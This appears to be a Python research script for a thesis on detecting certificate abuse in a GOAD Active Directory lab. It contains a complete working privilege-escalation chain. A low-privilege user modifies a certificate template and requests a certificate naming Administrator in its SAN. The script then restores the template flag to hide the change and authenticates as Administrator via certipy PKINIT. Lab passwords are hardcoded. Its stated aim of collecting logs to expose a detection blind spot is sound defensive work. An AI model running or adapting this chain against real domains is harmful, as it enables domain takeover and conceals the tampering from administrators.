#!/usr/bin/env python3
"""
prove_asn1_san_concealment_and_bridge.py — Live Groundwork Proof of ASN.1 SAN Concealment & CA-KDC Split-Brain
==============================================================================================================
Empirically demonstrates:
  1. Low-privilege user ESSOS\\khal.drogo mutates CGPubPositive (msPKI-Certificate-Name-Flag = 1).
  2. Generates CSR where Subject = "CN=khal.drogo" (matching requester!), but ASN.1 2.5.29.17 SAN = administrator@essos.local.
  3. Submits CSR headlessly as ESSOS\\khal.drogo to CA on SRV03 -> CA issues certificate.
  4. Accepts certificate and exports unprotected PFX.
  5. Rolls back CGPubPositive flag to 33554432.
  6. Authenticates via Kerberos PKINIT against DC03 -> DC03 logs Event 4768 with PreAuthType=16 for Administrator!
  7. Exports SRV03 CA database bridge (RequestID, RequesterName, SerialNumber, CertificateHash, SubjectKeyIdentifier, UPN, CommonName).
  8. Saves raw XML events (5136, 4886, 4887, 4768) and ca_db_bridge.csv to thesis_research/data/live_goad_traces/.
  9. Mathematically proves the single-host blind spot and cross-layer reconstruction.
"""

import sys
import os
import time
import base64
import re

# Monkeypatch pkgutil.ImpImporter for Python 3.14 compatibility before importing certipy
import pkgutil
if not hasattr(pkgutil, 'ImpImporter'):
    class ImpImporter: pass
    pkgutil.ImpImporter = ImpImporter

# Put local site-packages into path after standard lib
sys.path.append('/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
from certipy.entry import main as certipy_main

OUT_DIR = "/home/m4x1d/Desktop/GOAD/thesis_research/data/live_goad_traces"
os.makedirs(OUT_DIR, exist_ok=True)

# Administrative sessions for setup / log extraction
s_dc_admin = winrm.Session('http://127.0.0.1:55985/wsman', auth=('vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_admin = winrm.Session('http://127.0.0.1:56985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

# True low-privilege attacker session: ESSOS\khal.drogo (SID: S-1-5-21-...-1115)
s_dc_khal = winrm.Session('http://127.0.0.1:55985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_khal = winrm.Session('http://127.0.0.1:56985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

def get_current_event_record_id(session, log_name='Security'):
    ps = f"""
    $e = Get-WinEvent -FilterHashtable @{{LogName='{log_name}'}} -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($e) {{ $e.RecordId }} else {{ 0 }}
    """
    res = session.run_ps(ps)
    try:
        return int(res.std_out.decode('utf-8', errors='ignore').strip())
    except Exception:
        return 0

def export_events_since(session, start_record_id, event_ids=(5136, 4886, 4887, 4768, 4769, 4624)):
    id_list = ",".join(str(i) for i in event_ids)
    ps = f"""
    $events = Get-WinEvent -FilterHashtable @{{LogName='Security'; ID=@({id_list}); StartTime=(Get-Date).AddMinutes(-5)}} -ErrorAction SilentlyContinue | Where-Object {{ $_.RecordId -gt {start_record_id} }}
    if ($events) {{
        $xmls = foreach ($e in $events) {{ $e.ToXml() }}
        $xmls -join "`n"
    }} else {{
        ""
    }}
    """
    res = session.run_ps(ps)
    return res.std_out.decode('utf-8', errors='ignore').strip()

print("="*80)
print(" TASK 2: PROVE ASN.1 SAN CONCEALMENT & CA-KDC CRYPTOGRAPHIC DISCONTINUITY")
print("="*80)

# 0. Check khal.drogo identity
who_res = s_dc_khal.run_cmd("whoami /user")
print("[*] Low-privilege execution context:\n   ", who_res.std_out.decode('utf-8', errors='ignore').strip().replace('\n', '\n    '))

dc_start_rec = get_current_event_record_id(s_dc_admin)
srv_start_rec = get_current_event_record_id(s_srv_admin)

# 1. Mutate template CGPubPositive msPKI-Certificate-Name-Flag to 1 as khal.drogo
print("\n[Step 1] khal.drogo mutates CGPubPositive: msPKI-Certificate-Name-Flag = 1...")
mut_ps = """
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
"""
s_dc_khal.run_ps(mut_ps)

# 2. Generate concealed CSR on DC03 as khal.drogo
print("[Step 2] khal.drogo generates CSR: Subject='CN=khal.drogo', SAN='administrator@essos.local'...")
inf_ps = """
$inf = @"
[NewRequest]
Subject = "CN=khal.drogo"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\asn1_proof.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\asn1_proof.inf C:\\Shared\\asn1_proof.req" -Wait -PassThru -NoNewWindow
Write-Output ("CSR ExitCode: " + $p.ExitCode)
"""
r_inf = s_dc_khal.run_ps(inf_ps)
print("    [+]", r_inf.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))

# 3. Transfer CSR to SRV03 and submit headlessly as khal.drogo
print("[Step 3] khal.drogo submits CSR headlessly to CA on SRV03...")
req_b64 = s_dc_admin.run_ps("[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\\Shared\\asn1_proof.req'))").std_out.decode('utf-8', errors='ignore').strip()
s_srv_admin.run_ps(f"[System.IO.File]::WriteAllBytes('C:\\Shared\\asn1_proof.req', [System.Convert]::FromBase64String('{req_b64}'))")

srv_submit_ps = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\asn1_proof.req C:\\Shared\\asn1_proof.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub = s_srv_khal.run_ps(srv_submit_ps)
print("    [+]", r_sub.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))

# 4. Rollback template flag on DC03 as khal.drogo
print("[Step 4] khal.drogo rolls back CGPubPositive: msPKI-Certificate-Name-Flag = 33554432...")
rev_ps = """
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
"""
s_dc_khal.run_ps(rev_ps)
time.sleep(2)

# 5. Transfer issued certificate back to DC03, accept into khal.drogo store, and export PFX
print("[Step 5] khal.drogo accepts certificate and exports PFX...")
cer_b64 = s_srv_admin.run_ps("[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\\Shared\\asn1_proof.cer'))").std_out.decode('utf-8', errors='ignore').strip()
s_dc_admin.run_ps(f"[System.IO.File]::WriteAllBytes('C:\\Shared\\asn1_proof.cer', [System.Convert]::FromBase64String('{cer_b64}'))")

accept_ps = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-accept -user -q C:\\Shared\\asn1_proof.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Accept ExitCode: " + $p.ExitCode)

# Locate newly accepted certificate in khal.drogo store
$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey } | Sort-Object NotBefore -Descending | Select-Object -First 1
Write-Output ("Cert Serial: " + $cert.SerialNumber)
Write-Output ("Cert Thumbprint: " + $cert.Thumbprint)
Write-Output ("Cert Subject: " + $cert.Subject)

$pwd = ConvertTo-SecureString -String "Secret123" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "C:\\Shared\\asn1_proof.pfx" -Password $pwd | Out-Null
Write-Output ("PFX Exists: " + (Test-Path "C:\\Shared\\asn1_proof.pfx"))
"""
r_acc = s_dc_khal.run_ps(accept_ps)
print("    [+]", r_acc.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))

# 6. Download PFX to Linux and create unprotected PFX for certipy
pfx_b64 = s_dc_admin.run_ps("[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\\Shared\\asn1_proof.pfx'))").std_out.decode('utf-8', errors='ignore').strip()
pfx_raw = base64.b64decode(pfx_b64)
key, cert_obj, add_certs = pkcs12.load_key_and_certificates(pfx_raw, b"Secret123")
unprotected_pfx = pkcs12.serialize_key_and_certificates(name=b"asn1", key=key, cert=cert_obj, cas=add_certs, encryption_algorithm=NoEncryption())
local_pfx_path = "/tmp/asn1_concealed.pfx"
with open(local_pfx_path, "wb") as f:
    f.write(unprotected_pfx)

# 7. Authenticate via Kerberos PKINIT against DC03 (172.18.0.2:88)
print("\n[Step 6] Authenticating via Kerberos PKINIT as Administrator using concealed PFX...")
sys.argv = ["certipy", "auth", "-pfx", local_pfx_path, "-dc-ip", "172.18.0.2", "-no-hash"]
certipy_main()
time.sleep(2)

# 8. Export CA Database Bridge from SRV03
print("\n[Step 7] Exporting CA Database Cryptographic Bridge from SRV03...")
export_bridge_cmd = 'certutil -view -restrict "Disposition=20" -out "RequestID,RequesterName,SerialNumber,CertificateHash,SubjectKeyIdentifier,CertificateTemplate,UPN,CommonName,NotBefore,NotAfter" csv'
r_bridge = s_srv_admin.run_cmd(export_bridge_cmd)
bridge_csv = r_bridge.std_out.decode('utf-8', errors='ignore').strip()
bridge_path = os.path.join(OUT_DIR, "srv03_ca_db_bridge.csv")
with open(bridge_path, "w", encoding="utf-8") as f:
    f.write(bridge_csv)
print(f"    [+] Saved CA Database Cryptographic Bridge to: {bridge_path}")

# 9. Export Windows Event Logs from DC03 and SRV03
print("\n[Step 8] Exporting live Windows Event Logs (5136, 4886, 4887, 4768)...")
dc_xml = export_events_since(s_dc_admin, dc_start_rec)
srv_xml = export_events_since(s_srv_admin, srv_start_rec)

all_chunks = []
if dc_xml:
    all_chunks.extend(re.findall(r'<Event[\s\S]*?</Event>', dc_xml))
if srv_xml:
    all_chunks.extend(re.findall(r'<Event[\s\S]*?</Event>', srv_xml))

def extract_time(chunk):
    m = re.search(r"SystemTime='([^']+)'", chunk)
    return m.group(1) if m else ""

all_chunks.sort(key=extract_time)
trace_file = os.path.join(OUT_DIR, "trace_asn1_san_concealment.xml")
with open(trace_file, 'w', encoding='utf-8') as f:
    f.write("<Events>\n" + "\n".join(all_chunks) + "\n</Events>\n")

id_counts = {}
for chunk in all_chunks:
    m = re.search(r"<EventID>(\d+)</EventID>", chunk)
    if m:
        eid = int(m.group(1))
        id_counts[eid] = id_counts.get(eid, 0) + 1

print(f"    [+] Saved combined trace to: {trace_file} ({len(all_chunks)} events)")
print(f"    [+] Event ID Breakdown: {dict(sorted(id_counts.items()))}")

# 10. Print Side-by-Side Verification of the Blind Spot
print("\n" + "="*80)
print(" EMPIRICAL VERIFICATION: ASN.1 SAN CONCEALMENT & CA-KDC SPLIT-BRAIN")
print("="*80)

# Extract Event 4887
ev_4887 = [c for c in all_chunks if "<EventID>4887</EventID>" in c]
latest_4887 = ev_4887[-1] if ev_4887 else ""

# Extract Event 4768 (PKINIT: PreAuthType = 16)
ev_4768 = [c for c in all_chunks if "<EventID>4768</EventID>" in c and "<Data Name='PreAuthType'>16</Data>" in c]
latest_4768 = ev_4768[-1] if ev_4768 else ""

print("[A] Single-Host CA Telemetry (SRV03 Event ID 4887):")
if latest_4887:
    for line in latest_4887.splitlines():
        if any(tag in line for tag in ['RequestId', 'Requester', 'SubjectKeyIdentifier', 'Subject', 'Disposition']):
            print("   ", line.strip())
else:
    print("    [-] No Event 4887 found!")

print("\n[B] Single-Host KDC Telemetry (DC03 Event ID 4768 PKINIT):")
if latest_4768:
    for line in latest_4768.splitlines():
        if any(tag in line for tag in ['TargetUserName', 'PreAuthType', 'CertSerialNumber', 'CertThumbprint', 'Status']):
            print("   ", line.strip())
else:
    print("    [-] No PKINIT Event 4768 found!")

print("\n[C] Cryptographic Bridge Resolution (via srv03_ca_db_bridge.csv):")
lines = [l for l in bridge_csv.splitlines() if "khal.drogo" in l]
if lines:
    print("    Latest Bridge Record:")
    print("   ", lines[-1])
print("="*80)
